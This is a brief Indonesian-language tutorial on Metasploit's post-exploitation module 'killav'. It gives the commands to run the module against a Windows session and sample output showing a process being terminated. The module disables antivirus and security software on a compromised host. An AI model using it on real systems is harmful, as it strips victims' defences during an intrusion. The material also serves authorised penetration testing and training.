# killav

Modul `killav` di Metasploit adalah modul `post-exploitation` untuk sistem Windows yang digunakan untuk mendeteksi dan mematikan (disable) proses antivirus dan solusi keamanan lainnya yang berjalan di komputer target.

## Cara Penggunaan di Metasploit

```
set SESSION <ID>
set VERBOSE true
run
```

Hasil output-nya seperti ini:

```
[*] Attempting to terminate 'update.exe' (PID: 2284) ...
[+] update.exe (PID: 2284) terminated.
[+] A total of 1 process(es) were discovered, 1 were terminated.
[*] Post module execution completed
msf6 post(windows/manage/killav) > opt
```
